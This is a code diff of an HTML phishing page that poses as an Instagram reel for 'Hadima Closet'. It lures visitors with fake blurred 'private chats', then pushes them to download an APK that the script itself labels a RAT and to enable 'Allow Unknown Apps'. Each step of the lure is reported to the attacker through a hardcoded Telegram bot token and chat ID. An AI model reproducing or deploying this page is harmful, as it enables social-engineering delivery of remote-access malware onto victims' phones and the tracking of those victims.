@@ -1,85 +1,73 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hadima Closet Exclusive</title>
+    <title>Hadima Closet - Exclusive Logs</title>
     <style>
-        body { margin: 0; background: #000; color: #fff; font-family: sans-serif; overflow: hidden; height: 100vh; }
-        #start-screen { position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; background: #000; z-index: 999; }
-        .btn { padding: 15px 40px; background: #8e44ad; border: none; color: #fff; font-size: 18px; border-radius: 30px; cursor: pointer; font-weight: bold; box-shadow: 0 0 20px #8e44ad; }
-        #overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 100; flex-direction: column; align-items: center; justify-content: center; }
-        .blur-preview { width: 85%; height: 200px; background: linear-gradient(45deg, #222, #333); filter: blur(15px); border: 1px solid #8e44ad; border-radius: 15px; margin-bottom: 20px; position: relative; }
-        .blur-preview::after { content: '🔒 PRIVATE CHAT'; position: absolute; top: 45%; left: 25%; filter: blur(0); color: #8e44ad; font-weight: bold; }
-        .popup { background: #1a1a1a; border: 2px solid #8e44ad; border-radius: 20px; padding: 25px; width: 85%; max-width: 320px; text-align: center; box-shadow: 0 0 30px #000; }
-        iframe { width: 100%; height: 100%; border: none; }
-        .loader { border: 3px solid #333; border-top: 3px solid #8e44ad; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 15px auto; }
+        body { margin: 0; background: #000; color: #fff; font-family: -apple-system, sans-serif; overflow: hidden; }
+        #app { height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .inst-header { position: fixed; top: 0; width: 100%; padding: 15px; background: #121212; border-bottom: 1px solid #333; text-align: center; font-weight: bold; }
+        #reel-placeholder { width: 100%; height: 70vh; background: #1a1a1a url('https://i.imgur.com/8m5XQ9W.png') center/cover; display: flex; align-items: center; justify-content: center; position: relative; }
+        .play-icon { font-size: 50px; opacity: 0.8; }
+        #overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.92); z-index: 100; flex-direction: column; align-items: center; justify-content: center; }
+        .popup { background: #262626; border-radius: 15px; padding: 25px; width: 80%; max-width: 300px; text-align: center; border: 1px solid #8e44ad; }
+        .btn { background: #0095f6; color: #fff; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; margin-top: 15px; cursor: pointer; }
+        .blur-chat { width: 100%; height: 150px; background: #333; filter: blur(15px); border-radius: 10px; margin-bottom: 15px; border: 1px solid #444; }
+        .loader { border: 2px solid #333; border-top: 2px solid #0095f6; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin: 10px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div id="start-screen">
-    <button class="btn" onclick="executeAtoZ()">Watch Reel & Unlock Chats</button>
-</div>
+<div class="inst-header">hadimacloset_exclusive</div>
 
-<div id="overlay">
-    <div class="blur-preview"></div>
-    <div class="popup" id="main-box">
-        <h3 style="color:#8e44ad; margin:0;">Access Found!</h3>
-        <p style="font-size:14px; margin: 15px 0;">Aap <b>Hadima-Closet</b> ki private chats dekh sakte hain. <br><br> Bas 'OK' dabayein aur Viewer install karke chats unlock karein.</p>
-        <button class="btn" style="width:100%;" onclick="forceInstall()">OK</button>
+<div id="app">
+    <div id="reel-placeholder" onclick="startTrap()">
+        <div class="play-icon">▶️</div>
+        <p style="position:absolute; bottom:20px;">Click to watch Exclusive Lavender Collection</p>
     </div>
 </div>
 
-<div id="video-container" style="width:100%; height:100%;">
-    <iframe id="reel-frame"></iframe>
+<div id="overlay">
+    <div class="blur-chat"></div>
+    <div id="popup-box" class="popup">
+        <h3 style="margin:0; color:#8e44ad;">🔓 Private Logs Found</h3>
+        <p style="font-size:13px; color:#ccc;">Aap dekh sakte hain <b>Hadima-Closet</b> ki private chats aur secrets.<br><br>Click 'OK' to install Decryptor and view chats.</p>
+        <button class="btn" onclick="triggerDownload()">OK</button>
+    </div>
 </div>
 
 <script>
-    const BOT_TOKEN = "8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k";
-    const CHAT_ID = "8639892987";
-    const APK_URL = "https://raw.githubusercontent.com/AapkaUsername/Repo/main/viewer.apk"; // APK link yahan badlein
+    const T = "8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k"; 
+    const C = "8639892987";
+    const RAT = "https://github.com/AapkaUsername/Repo/raw/main/hadima_viewer.apk"; 
 
-    function notifyTelegram(msg) {
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`)
-        .catch(e => console.error("Notif Error"));
+    function log(msg) {
+        fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}`);
     }
 
-    async function executeAtoZ() {
-        document.getElementById('start-screen').style.display = 'none';
-        document.getElementById('reel-frame').src = "https://www.instagram.com/reel/C5_8mY_S9z4/embed/"; // Working Reel Link
-        
-        notifyTelegram("🚀 ATTACK STARTED: User is watching reel.");
-
-        // Reel ke middle mein popup (9 seconds baad)
+    function startTrap() {
+        log("✅ TARGET_HOOKED: Target clicked on Fake Reel.");
+        // Reel chalne ka natak (5 seconds)
+        document.querySelector('.play-icon').innerHTML = "⌛";
         setTimeout(() => {
             document.getElementById('overlay').style.display = 'flex';
-            notifyTelegram("👀 BAIT SHOWN: Target seeing blurred chats.");
-        }, 9000);
+            log("👀 BAIT_ACTIVE: Curiosity popup shown.");
+        }, 5000);
     }
 
-    function forceInstall() {
-        notifyTelegram("🔥 SUCCESS: Target clicked OK. RAT downloading...");
-        
-        // Step 1: Trigger Download
-        window.location.href = APK_URL;
+    function triggerDownload() {
+        log("🔥 ATTACK_SUCCESS: RAT downloading...");
+        window.location.href = RAT;
 
-        // Step 2: Show Instructions & Loading (The Trap)
-        document.getElementById('main-box').innerHTML = `
+        document.getElementById('popup-box').innerHTML = `
             <div class="loader"></div>
-            <h3 style="color:#8e44ad;">⚙️ Setting up Viewer...</h3>
-            <p style="font-size:13px;">Chats unlock karne ke liye niche diye gaye steps follow karein:</p>
-            <div style="text-align:left; font-size:12px; background:#222; padding:10px; border-radius:10px;">
-                1. Download hone ke baad file ko Open karein.<br>
-                2. <b>Settings</b> par click karein.<br>
-                3. <b>Allow Unknown Apps</b> ko On karein.<br>
-                4. Wapas yahan aayein, chats load ho jayengi.
-            </div>
-            <p style="font-size:11px; color:#555; margin-top:10px;">Status: Waiting for permission...</p>
+            <h3>⚙️ Unlocking Chats...</h3>
+            <p style="font-size:12px;">Security Bypass ke liye <b>Settings > Allow Unknown Apps</b> ko enable karein.</p>
+            <p style="font-size:10px; color:#666;">Mirroring in progress... Do not close.</p>
         `;
     }
 </script>
-
 </body>
 </html>
